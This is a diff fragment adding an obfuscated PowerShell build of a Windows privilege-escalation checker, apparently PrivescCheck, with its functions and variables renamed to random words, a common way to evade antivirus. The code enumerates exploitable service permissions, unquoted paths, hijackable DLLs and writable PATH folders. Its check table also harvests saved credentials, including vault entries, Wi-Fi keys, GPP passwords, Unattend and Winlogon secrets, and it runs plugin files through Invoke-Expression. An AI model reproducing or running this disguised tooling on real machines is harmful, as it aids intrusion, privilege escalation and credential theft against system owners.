+        ForEach($TnoFDDCU99 in $Name) {
+            $tfuolnsE99 = $TnoFDDCU99 | someway
+            if ($tfuolnsE99 -and $tfuolnsE99.Dacl) { 
+                $evTqfAvT99 = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                $ZMcquVkc99 = $evTqfAvT99.Groups | Select-Object -ExpandProperty Value
+                $ZMcquVkc99 += $evTqfAvT99.User.Value
+                ForEach($QTEdtsfi99 in $tfuolnsE99.Dacl) {
+                    $SwpmUxdq99 = $False
+                    if($ZMcquVkc99 -contains $QTEdtsfi99.SecurityIdentifier) {
+                        if($xmrNnhQv99) {
+                            $MvNwAdoM99 = $True
+                            ForEach($bzIMGtdZ99 in $WyrhdgTp99) {
+                                if (($QTEdtsfi99.AccessRights -band $AccessMask[$bzIMGtdZ99]) -ne $AccessMask[$bzIMGtdZ99]) {
+                                    $MvNwAdoM99 = $False
+                                    break
+                                }
+                            }
+                            if($MvNwAdoM99) {
+                                $tfuolnsE99
+                                $SwpmUxdq99 = $True 
+                            }
+                        } else {
+                            ForEach($bzIMGtdZ99 in $WyrhdgTp99) {
+                                if (($QTEdtsfi99.AceType -eq 'AccessAllowed') -and ($QTEdtsfi99.AccessRights -band $AccessMask[$bzIMGtdZ99]) -eq $AccessMask[$bzIMGtdZ99]) {
+                                    Write-Verbose "Current user has '$bzIMGtdZ99' permission for $TnoFDDCU99"
+                                    $tfuolnsE99
+                                    $SwpmUxdq99 = $True 
+                                    break
+                                }
+                            }
+                        }
+                    }
+                    if ($SwpmUxdq99) {
+                        break
+                    }
+                }
+            } else {
+                Write-Verbose "Error enumerating the Dacl for service $TnoFDDCU99"
+            }
+        }
+    }
+}
+function cathartic {
+    
+    [CmdletBinding()] param()
+    $UMBVXliP99 = New-Object -TypeName System.Collections.ArrayList
+    $rGImNXqA99 = booty -AJMSSkMr99 3
+    Write-Verbose "Enumerating $($rGImNXqA99.Count) services..."
+    ForEach ($ghiDMOMF99 in $rGImNXqA99) {
+        $MvURoNoO99 = New-Object -TypeName PSObject 
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ghiDMOMF99.Name
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $ghiDMOMF99.DisplayName
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $ghiDMOMF99.ImagePath
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "User" -Value $ghiDMOMF99.User
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $ghiDMOMF99.StartMode
+        [void]$UMBVXliP99.Add($MvURoNoO99)
+    }
+    $UMBVXliP99
+}
+function mossiest {
+    
+    [CmdletBinding()] param()
+    
+    $jqKFlzLl99 = booty -AJMSSkMr99 2 
+    Write-Verbose "Enumerating $($jqKFlzLl99.Count) services..."
+    ForEach ($ghiDMOMF99 in $jqKFlzLl99) {
+        transference -Path $ghiDMOMF99.RegistryPath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
+            $PGwQfWGS99 = "Unknown"
+            $erfwXCas99 = slakes -Name $ghiDMOMF99.Name -PermissionSet 'Restart'
+            if ($erfwXCas99) { $LHjPRSOT99 = $True; $PGwQfWGS99 = $erfwXCas99.Status } else { $LHjPRSOT99 = $False }
+    
+            $mezECGsd99 = slakes -Name $ghiDMOMF99.Name -dyoofDjS99 'Start'
+            if ($mezECGsd99) { $EzPpZkQd99 = $True; $PGwQfWGS99 = $mezECGsd99.Status } else { $EzPpZkQd99 = $False }
+            $MvURoNoO99 = New-Object -TypeName PSObject 
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ghiDMOMF99.Name
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $ghiDMOMF99.ImagePath
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "User" -Value $ghiDMOMF99.User
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $PGwQfWGS99
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $EzPpZkQd99
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $LHjPRSOT99
+            $MvURoNoO99
+        }
+    }
+}
+function sufferings {
+    
+    [CmdletBinding()] param()
+    $hOiMIspN99 = booty -AJMSSkMr99 2
+    Write-Verbose "Enumerating $($hOiMIspN99.Count) services..."
+    
+    ForEach ($ghiDMOMF99 in $hOiMIspN99) {
+        $RYytQiXd99 = $ghiDMOMF99.ImagePath.trim()
+        Congress -Path $RYytQiXd99 | ForEach-Object {
+            $PGwQfWGS99 = "Unknown"
+            $erfwXCas99 = slakes -Name $ghiDMOMF99.Name -PermissionSet 'Restart'
+            if ($erfwXCas99) { $LHjPRSOT99 = $True; $PGwQfWGS99 = $erfwXCas99.Status } else { $LHjPRSOT99 = $False }
+    
+            $mezECGsd99 = slakes -Name $ghiDMOMF99.Name -dyoofDjS99 'Start'
+            if ($mezECGsd99) { $EzPpZkQd99 = $True; $PGwQfWGS99 = $mezECGsd99.Status } else { $EzPpZkQd99 = $False }
+            $MvURoNoO99 = New-Object -TypeName PSObject 
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ghiDMOMF99.Name
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $ghiDMOMF99.ImagePath
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "User" -Value $ghiDMOMF99.User
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $PGwQfWGS99
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $EzPpZkQd99
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $LHjPRSOT99
+            $MvURoNoO99
+        }
+    }
+}
+function predated {
+    
+    [CmdletBinding()] param()
+    
+    $hOiMIspN99 = booty -AJMSSkMr99 1
+    Write-Verbose "Enumerating $($hOiMIspN99.Count) services..."
+    ForEach ($ghiDMOMF99 in $hOiMIspN99) {
+        $ghiDMOMF99.ImagePath | ruined | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
+            
+            $PGwQfWGS99 = "Unknown"
+            $erfwXCas99 = slakes -Name $ghiDMOMF99.Name -PermissionSet 'Restart'
+            if ($erfwXCas99) { $LHjPRSOT99 = $True; $PGwQfWGS99 = $erfwXCas99.Status } else { $LHjPRSOT99 = $False }
+    
+            $mezECGsd99 = slakes -Name $ghiDMOMF99.Name -dyoofDjS99 'Start'
+            if ($mezECGsd99) { $EzPpZkQd99 = $True; $PGwQfWGS99 = $mezECGsd99.Status } else { $EzPpZkQd99 = $False }
+            $MvURoNoO99 = New-Object -TypeName PSObject 
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ghiDMOMF99.Name
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $ghiDMOMF99.ImagePath
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "User" -Value $ghiDMOMF99.User
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $PGwQfWGS99
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $EzPpZkQd99
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $LHjPRSOT99
+            $MvURoNoO99
+        }
+    }
+}
+function hulas {
+    
+    [CmdletBinding()] param()
+    $hOiMIspN99 = booty -AJMSSkMr99 1
+    Write-Verbose "Enumerating $($hOiMIspN99.Count) services..."
+    ForEach ($ghiDMOMF99 in $hOiMIspN99) {
+        $tfuolnsE99 = slakes -Name $ghiDMOMF99.Name -PermissionSet 'ChangeConfig'
+        if ($tfuolnsE99) {
+            $erfwXCas99 = slakes -Name $ghiDMOMF99.Name -PermissionSet 'Restart'
+            if ($erfwXCas99) { $LHjPRSOT99 = $True } else { $LHjPRSOT99 = $False }
+            $mezECGsd99 = slakes -Name $ghiDMOMF99.Name -dyoofDjS99 'Start'
+            if ($mezECGsd99) { $EzPpZkQd99 = $True } else { $EzPpZkQd99 = $False }
+            $MvURoNoO99 = New-Object -TypeName PSObject  
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ghiDMOMF99.Name 
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $ghiDMOMF99.ImagePath 
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "User" -Value $ghiDMOMF99.User
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $tfuolnsE99.Status 
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $EzPpZkQd99
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $LHjPRSOT99
+            $MvURoNoO99
+        }
+    }
+}
+function satelliting {
+    
+    [CmdletBinding()] param()
+    
+    $joIEKGkP99 = (Get-ItemProperty -Path "Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name "Path").Path 
+    $Paths = $joIEKGkP99.Split(';')
+    ForEach ($Path in $Paths) {
+        if ($Path -and $Path -ne '') {
+            $Path | ruined -loyqyiRW99 | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
+                $Item = New-Object -TypeName PSObject
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $Path
+                $Item | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
+                $Item | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
+                $Item
+            }
+        }
+    }
+}
+function agglutinates {
+    [CmdletBinding()] param()
+    function woodpile {
+        [CmdletBinding()] param (
+            [string]$Name
+        )
+        $HbUTOCgI99 = New-Object System.Collections.ArrayList
+        [void]$HbUTOCgI99.Add($(Join-Path -Path $env:windir -ChildPath "System32"))
+        [void]$HbUTOCgI99.Add($(Join-Path -Path $env:windir -ChildPath "SysNative"))
+        [void]$HbUTOCgI99.Add($(Join-Path -Path $env:windir -ChildPath "System"))
+        [void]$HbUTOCgI99.Add($env:windir)
+        ForEach ($SpodokqB99 in [string[]]$HbUTOCgI99) {
+            $Path = Join-Path -Path $SpodokqB99 -ChildPath $Name 
+            $Null = Get-Item -Path $Path -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem 
+            if (-not $OwEwxdGA99) {
+                return $True
+            }
+        }
+        return $False
+    }
+    function deescalating {
+        [CmdletBinding()] param (
+            [string]$tlNKEszk99,
+            [string]$DllName,
+            [string]$SSwKgPSl99,
+            [boolean]$ODZGKHUV99 = $True
+        )
+        $ghiDMOMF99 = swindles -Name $tlNKEszk99 
+        if ($ghiDMOMF99 -and ($ghiDMOMF99.StartMode -ne "Disabled")) {
+            if (-not (woodpile -Name $DllName)) {
+                $MvMtujlX99 = New-Object -TypeName PSObject
+                $MvMtujlX99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $DllName
+                $MvMtujlX99 | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $SSwKgPSl99
+                $MvMtujlX99 | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value $ghiDMOMF99.User
+                $MvMtujlX99 | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $ODZGKHUV99 
+                $MvMtujlX99
+            }
+        }
+    }
+    $QGgQyZuh99 = [System.Environment]::OSVersion.Version
+    if ($QGgQyZuh99.Major -eq 10) {
+        deescalating -tlNKEszk99 "CDPSvc" -DllName "cdpsgshims.dll" -SSwKgPSl99 "Loaded by CDPSvc upon service startup"
+        deescalating -tlNKEszk99 "Schedule" -DllName "WptsExtensions.dll" -SSwKgPSl99 "Loaded by the Task Scheduler upon service startup"
+    }
+    if (($QGgQyZuh99.Major -eq 6) -and ($QGgQyZuh99.Minor -ge 1) -and ($QGgQyZuh99.Minor -le 3)) {
+        deescalating -tlNKEszk99 "DiagTrack" -DllName "windowsperformancerecordercontrol.dll" -SSwKgPSl99 "Loaded by DiagTrack upon service startup or shutdown"
+        deescalating -tlNKEszk99 "DiagTrack" -DllName "diagtrack_win.dll" -SSwKgPSl99 "Loaded by DiagTrack upon service startup"
+    }
+    if (($QGgQyZuh99.Major -eq 6) -and ($QGgQyZuh99.Minor -ge 0) -and ($QGgQyZuh99.Minor -le 2)) {
+        $ODZGKHUV99 = $True
+        $ghiDMOMF99 = Get-Service -Name "IKEEXT" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetService
+        if ((-not $HgoSJXHD99) -and ($ghiDMOMF99.Status -eq "Stopped")) {
+            $ODZGKHUV99 = $False
+        }
+        deescalating -tlNKEszk99 "IKEEXT" -DllName "wlbsctrl.dll" -SSwKgPSl99 "Loaded by IKEEXT upon service startup" -ODZGKHUV99 $ODZGKHUV99
+    }
+    if (($QGgQyZuh99.Major -eq 6) -and ($QGgQyZuh99.Minor -eq 1)) {
+        deescalating -tlNKEszk99 "NetMan" -DllName "wlanhlp.dll" -SSwKgPSl99 "Loaded by NetMan when listing network interfaces" -ODZGKHUV99 $False
+    }
+    if (($QGgQyZuh99.Major -eq 10) -or (($QGgQyZuh99.Major -eq 6) -and ($QGgQyZuh99.Minor -ge 2) -and ($QGgQyZuh99.Minor -le 3))) {
+        deescalating -tlNKEszk99 "NetMan" -DllName "wlanapi.dll" -SSwKgPSl99 "Loaded by NetMan when listing network interfaces" -ODZGKHUV99 $False
+        
+    }
+}
+function fistful {
+    [CmdletBinding()] param(
+        [switch]$UanQdFxz99 = $False,
+        [switch]$Force = $False,
+        [switch]$PJdWYbFD99 = $False,
+        [string]$ZzWremFL99,
+        [ValidateSet("TXT", "HTML", "CSV")][string[]]$rWCNixMz99
+    )
+    $GzzyCUtH99 = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+    if($GzzyCUtH99) {
+        if (-not $Force) {
+            Write-Warning "You are running this script as an administrator! Some checks will be automatically disabled."
+            Write-Warning "You can specify the '-Force' option to disable this warning message."
+            Start-Sleep -Seconds 10
+        }
+    }
+    $NXBlnTuP99 = @"
+"Id", "File", "Command", "Params", "Category", "DisplayName", "Type", "Severity", "Description", "Format", "Extended", "RunIfAdmin"
+"USER_USER", "", "nursing", "", "User", "whoami", "Info", "Info", "Get the full name of the current user (domain + username) along with the associated Security Identifier (SID).", "Table", True, True
+"USER_GROUPS", "", "kitchenware", "", "User", "whoami /groups", "Info", "Info", "List the groups the current user belongs to. Default groups are filtered out to minimize the output.", "Table", True, True
+"USER_PRIVILEGES", "", "repercussion", "", "User", "Privileges", "Vuln", "High", "List the privileges that are associated to the current user's token. If any of them can be leveraged to somehow run code in the context of the SYSTEM account, it will be reported as a finding.", "Table", False, False
+"USER_ENV", "", "calls", "", "User", "Environment Variables", "Info", "Info", "List the environment variables of the current process and try to identify any potentially sensitive information such as passwords or API secrets. This check is simply based on keyword matching and might not be entirely reliable.", "Table", False, True
+"SERVICE_INSTALLED", "", "cathartic", "", "Services", "Non-default Services", "Info", "Info", "List all registered services and filter out the ones that are built into Windows. It does so by parsing the target executable's metadata.", "List", False, True
+"SERVICE_PERMISSIONS", "", "hulas", "", "Services", "Permissions - SCM", "Vuln", "High", "Interact with the Service Control Manager (SCM) and check whether the current user can modify any registered service.", "List", False, False
+"SERVICE_PERMISSIONS_REGISTRY", "", "mossiest", "", "Services", "Permissions - Registry", "Vuln", "High", "Parse the registry and check whether the current user can modify the configuration of any registered service.", "List", False, False
+"SERVICE_IMAGE_PERMISSIONS", "", "predated", "", "Services", "Binary Permissions", "Vuln", "High", "List all services and check whether the current user can modify the target executable or write files in its parent folder.", "List", False, False
+"SERVICE_UNQUOTED_PATH", "", "sufferings", "", "Services", "Unquoted Path", "Vuln", "Medium", "List registered services and check whether any of them is configured with an unquoted path that can be exploited.", "List", False, False
+"SERVICE_DLL_HIJACKING", "", "satelliting", "", "Services", "System's %PATH%", "Vuln", "High", "Retrieve the list of SYSTEM %PATH% folders and check whether the current user has some write permissions in any of them.", "List", False, False
+"SERVICE_HIJACKABLE_DLL", "", "agglutinates", "", "Services", "Hijackable DLLs", "Info", "Info", "List Windows services that are prone to Ghost DLL hijacking. This is particularly relevant if the current user can create files in one of the SYSTEM %PATH% folders.", "List", False, False
+"APP_INSTALLED", "", "Mujib", "", "Apps", "Non-default Apps", "Info", "Info", "Enumerate non-default and third-party applications by parsing the registry.", "Table", True, True
+"APP_MODIFIABLE", "", "formulated", "", "Apps", "Modifiable Apps", "Vuln", "Medium", "List non-default and third-party applications and report the ones that can be modified by the current user.", "List", False, False
+"APP_PROGRAMDATA", "", "dons", "", "Apps", "ProgramData folders/files", "Info", "Info", "List the non-default ProgramData folders and check whether the current user has write permissions. This check is purely informative and the results require manual analysis.", "List", True, False
+"APP_STARTUP", "", "fiascos", "", "Apps", "Apps Run on Startup", "Info", "Info", "Enumerate the system-wide applications that are run on start-up.", "List", True, True
+"APP_STARTUP_VULN", "", "stopped", "", "Apps", "Modifiable Apps Run on Startup", "Vuln", "Medium", "Enumerate the system-wide applications that are run on start-up and check whether they can be modified by the current user.", "List", False, False
+"APP_PROCESSES", "", "Golden", "", "Apps", "Running Processes", "Info", "Info", "List processes that are not owned by the current user and filter out common processes such as 'svchost.exe'.", "Table", True, True
+"SCHTASKS_IMAGE_PERMISSIONS", "", "goriest", "", "Scheduled Tasks", "Binary Permissions", "Vuln", "Medium", "Enumerate the scheduled tasks that are not owned by the current user and checks whether the target binary can be modified. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks.", "List", False, False
+"SCHTASKS_UNQUOTED_PATH", "", "protesters", "", "Scheduled Tasks", "Unquoted Path", "Vuln", "Medium", "Enumerate the scheduled tasks that are not owned by the current user and checks whether the corresponding command uses an exploitable unquoted path. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks.", "List", False, False
+"CREDS_SAM_BKP", "", "petitioners", "", "Creds", "SAM/SYSTEM Backup Files", "Vuln", "Medium", Check whether some backup files of the SAM/SYSTEM hives were created with insecure permissions.", "List", False, False
+"CREDS_UNATTENDED", "", "archiving", "", "Creds", "Unattended Files", "Vuln", "Medium", "Locate 'Unattend' files and check whether they contain any clear-text credentials.", "List", False, True
+"CREDS_WINLOGON", "", "fix", "", "Creds", "WinLogon", "Vuln", "Medium", "Parse the Winlogon registry keys and check whether they contain any clear-text password. Entries that have an empty password field are filtered out.", "List", False, True
+"CREDS_CRED_FILES", "", "frenetic", "", "Creds", "Credential Files", "Info", "Info", "Enumerate the credential files that are present in the current user's HOME folder. This is purely informative.", "List", True, True
+"CREDS_VAULT_CRED", "", "sure", "", "Creds", "Credential Manager", "Info", "Info", "Enumerate the credentials that are saved in the current user's vault.", "List", False, True
+"CREDS_VAULT_LIST", "", "herbicide", "", "Creds", "Credential Manager (web)", "Info", "Info", "Enumerate the web credentials that are saved in the current user's Vault.", "List", False, True
+"CREDS_GPP", "", "becalms", "", "Creds", "GPP Passwords", "Vuln", "Medium", "Locate old cached Group Policy Preference files that contain a 'cpassword' field and extract the clear-text credentials.", "List", False, True
+"CREDS_PS_HIST", "", "freethinker", "", "Creds", "PowerShell History", "Info", "Info", "Locate the current user's PowerShell history file and check whether it contains some clear-text credentials. This check is simply based on keyword matching and might not be entirely reliable.", "List", True, True
+"HARDEN_UAC", "", "Yugoslavian", "", "Hardening", "UAC Settings", "Info", "Info", "Retrieve the User Access Control (UAC) configuration and check whether it is enabled.", "List", True, True
+"HARDEN_LSA", "", "depend", "", "Hardening", "LSA protections", "Info", "Info", "Check whether 'lsass' runs as a Protected Process Light and/or if Credential Guard is enabled.", "Table", True, True
+"HARDEN_LAPS", "", "incursions", "", "Hardening", "LAPS Settings", "Info", "Info", "Parse the registry and determine whether LAPS is configured and enabled.", "List", True, True
+"HARDEN_PS_TRANSCRIPT", "", "innocuous", "", "Hardening", "PowerShell Transcription", "Info", "Info", "Check whether PowerShell Transcription is configured and enabled. If so, the path of the output log file will be returned.", "List", True, True
+"HARDEN_BITLOCKER", "", "Poland", "", "Hardening", "BitLocker", "Vuln", "High", "Check whether BitLocker is configured and enabled on the system drive. Note that this check will yield a false positive if another encryption software is in use.", "List", False, True
+"CONFIG_MSI", "", "upstaging", "", "Config", "AlwaysInstallElevated", "Vuln", "High", "Check whether the 'AlwaysInstallElevated' registry keys are configured and enabled. If so any user might be able to run arbitary MSI files with SYSTEM privileges.", "List", False, False
+"CONFIG_WSUS", "", "Orlons", "", "Config", "WSUS Configuration", "Vuln", "High", "If WSUS is in use, this check will determine whether or not it uses a secure URL. If not, it might be vulnerable to MitM attacks (c.f. 'WSUXploit' / 'WSuspicious').", "List", False, True
+"CONFIG_SCCM", "", "misgovern", "", "Config", "SCCM Cache Folder", "Info", "Info", "Checks whether the SCCM cache folder exists. Manual investigation might be required during post-exploitation.", "List", True, True
+"CONFIG_SCCM_VULN", "", "Kremlinologist", "", "Config", "SCCM Cache Folder", "Vuln", "Medium", "Checks whether the current user can browse the SCCM cache folder. If so, hardcoded credentials might be extracted from MSI package files or scripts.", "List", False, False
+"NET_TCP_ENDPOINTS", "", "bruising", "", "Network", "TCP Endpoints", "Info", "Info", "List all TCP ports that are in a LISTEN state. For each one, the corresponding process is also returned.", "Table", True, True
+"NET_UDP_ENDPOINTS", "", "obliterate", "", "Network", "UDP Endpoints", "Info", "Info", "List all UDP ports that are in a LISTEN state. For each one, the corresponding process is also returned. DNS is filtered out to minimize the output.", "Table", True, True
+"NET_WLAN", "", "colonizes", "", "Network", "Saved Wifi Profiles", "Info", "Info", "Enumerate saved Wifi profiles and extract clear-text WEP/WPA pre-shared keys and passphrases (if applicable).", "List", True, True
+"UPDATE_HISTORY", "", "fathomed", "", "Updates", "Last Windows Update Date", "Info", "Info", "Interact with the Windows Update service and determine when the system was last updated. Note that this check might be unreliable.", "Table", True, True
+"UPDATE_HOTFIX", "", "jawbone", "", "Updates", "Installed Updates and Hotfixes", "Info", "Info", "Enumerate the installed updates and hotfixes by parsing the registry. If this fails, the check will fall back to the built-in 'Get-HotFix' cmdlet.", "Table", True, True
+"UPDATE_HOTFIX_VULN", "", "excuse", "", "Updates", "System up to date?", "Vuln", "Medium", "Enumerate the installed updates and hotfixes and check whether a patch was applied in the last 31 days.", "List", False, True
+"MISC_AVEDR", "", "inconsistently", "", "Misc", "Endpoint Protection", "Info", "Info", "Enumerate installed security products (AV, EDR). This check is based on keyword matching (loaded DLLs, running processes, installed applications and registered services).", "Table", True, True
+"MISC_SYSINFO", "", "sportscast", "", "Misc", "OS Version", "Info", "Info", "Print the detailed version number of the Operating System. If we can't get the update history, this might be useful.", "Table", True, True
+"MISC_ADMINS", "", "Java", "", "Misc", "Local Admin Group", "Info", "Info", "Enumerate the users and groups that belong to the local 'Administrators' group.", "Table", True, True
+"MISC_HOMES", "", "battle", "", "Misc", "User Home Folders", "Info", "Info", "Enumerate local HOME folders and check for potentially weak permissions.", "Table", True, False
+"MISC_MACHINE_ROLE", "", "pita", "", "Misc", "Machine Role", "Info", "Info", "Simply return the machine's role. It can be either 'Workstation', 'Server' or 'Domain Controller'.", "Table", True, True
+"MISC_STARTUP_EVENTS", "", "cheapskate", "", "Misc", "System Startup History", "Info", "Info", "Retrieve the machine's startup history. This might be useful to figure out how often a server is rebooted. In the case of a workstation, such metric isn't as relevant.", "Table", True, True
+"MISC_STARTUP_LAST", "", "pervades", "", "Misc", "Last System Startup", "Info", "Info", "Determine the last system startup date and time based on the current tick count. Note that this might be unreliable.", "Table", True, True
+"MISC_DRIVES", "", "downsizing", "", "Misc", "Filesystem Drives", "Info", "Info", "List partitions, removable storage and mapped network shares.", "Table", True, True
+"@
+    $GPBkGppd99 = New-Object System.Collections.ArrayList
+    $NXBlnTuP99 | ConvertFrom-Csv | ForEach-Object {
+        [void] $GPBkGppd99.Add($_)
+    }
+    Write-Verbose "Script path: $($tCrMWeUn99)"
+    if (Test-Path $tCrMWeUn99) {
+        $nJtrarJa99 = Split-Path -Parent $tCrMWeUn99 -ErrorAction SilentlyContinue -ErrorVariable ErrorSplitPath
+        if (-not $ZVZNnPXo99) {
+            $uejCPXgc99 = Join-Path $nJtrarJa99 -ChildPath "\PrivescCheckPlugins\PrivescCheckPlugins.csv"
+            Write-Verbose "Plugin definition file: '$($uejCPXgc99)'"
+            if (Test-Path -Path $uejCPXgc99) {
+                Write-Verbose "Found plugin definition file: $($uejCPXgc99)"
+                Get-Content -Path $uejCPXgc99 -ErrorAction Stop | Out-String | ConvertFrom-Csv | ForEach-Object {
+                    [void] $GPBkGppd99.Add($_)
+                }
+            } else {
+                Write-Verbose "No plugin definition file found."
+            }
+        }
+    }
+    
+    $GPBkGppd99 | Where-Object { $_.File -ne "" } | Select-Object -ExpandProperty File | Sort-Object -Unique | ForEach-Object {
+        Write-Verbose "Plugin required: $($_)"
+        $rycaoYDP99 = Join-Path $nJtrarJa99 -ChildPath "\PrivescCheckPlugins\$($_)"
+        Get-Content -Path $rycaoYDP99 -ErrorAction Stop | Out-String | Invoke-Expression
+    }
+    $HzhsVkPu99 = 0
+    $GPBkGppd99 | ForEach-Object {
+        $pqbjEYph99 = $_
+        $sLimtZrX99 = [System.Convert]::ToBoolean($pqbjEYph99.RunIfAdmin)
+        if (($GzzyCUtH99 -and $sLimtZrX99) -or (-not $GzzyCUtH99)) {
+            $iFqBZpdG99 = [System.Convert]::ToBoolean($pqbjEYph99.Extended)
+            
+            if ($UanQdFxz99 -or ((-not $UanQdFxz99) -and (-not $iFqBZpdG99))) {
+                if ($PJdWYbFD99) {
+                    $HzhsVkPu99 += 1
+                    $LPXRNqzM99 = ($HzhsVkPu99 * 100) / ($GPBkGppd99.Count)
+                    Write-Progress -Activity "$($pqbjEYph99.Category.ToUpper()) > $($pqbjEYph99.DisplayName)" -PercentComplete $LPXRNqzM99
+                    $qUUxywoq99 = datelined -Check $pqbjEYph99
+                } else {
+                    sunbonnets -Check $pqbjEYph99
+                    $qUUxywoq99 = datelined -Check $pqbjEYph99
+                    regulatory -qUUxywoq99 $qUUxywoq99
+                }
+            }
+        }
+    }
+    nosiness
+    if ($ZzWremFL99) {
+        if (-not $rWCNixMz99) {
+            [string[]] $rWCNixMz99 = "TXT"
+        }
+        $rWCNixMz99 | ForEach-Object {
+            $wYbQMXEq99 = "$($ZzWremFL99.Trim()).$($_.ToLower())"
+            if ($_ -eq "TXT") {
+                operative -cDPKmtBg99 $bCYKJBek99 | Out-File $wYbQMXEq99
+            } elseif ($_ -eq "HTML") {
+                spiced -cDPKmtBg99 $bCYKJBek99 | Out-File $wYbQMXEq99
+            } elseif ($_ -eq "CSV") {
+                hairstylist -cDPKmtBg99 $bCYKJBek99 | Out-File $wYbQMXEq99
+            } else {
+                Write-Warning "`r`nReport format not implemented: $($rWCNixMz99.ToUpper())`r`n"
+            }
+        }
+    }
+    if ((-not $UanQdFxz99) -and (-not $Force) -and (-not $PJdWYbFD99)) {
+        Write-Warning "To get more info, run this script with the option '-Extended'."
+    }
+}
+function datelined {
+    [CmdletBinding()] param(
+        [object]$Check
+    )
+    $XwsMixSg99 = Invoke-Expression -Command "$($Check.Command) $($Check.Params)"
+    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $XwsMixSg99
+    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($XwsMixSg99 | Format-List | Out-String)
+    if ($($Check.Type -Like "vuln")) {
+        if ($XwsMixSg99) {
+            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "KO"
+        } else {
+            $Check.Severity = "None"
+            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "OK"
+        }
+    } else {
+        $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "N/A"
+        if (-not $XwsMixSg99) {
+            $Check.Severity = "None"
+        }
+    }
+    [void] $bCYKJBek99.Add($Check)
+    $Check
+}
+function sunbonnets {
+    [CmdletBinding()] param(
+        [object]$Check
+    )
+    function programmables {
+        param([string]$SSwKgPSl99)
+        $YEoRSTQC99 = New-Object System.Collections.ArrayList
+        $GcBimCGN99 = ""
+        $NAdaKwjF99 = ""
+        $SSwKgPSl99.Split(' ') | ForEach-Object {
+            $NAdaKwjF99 = "$($GcBimCGN99) $($_)".Trim()
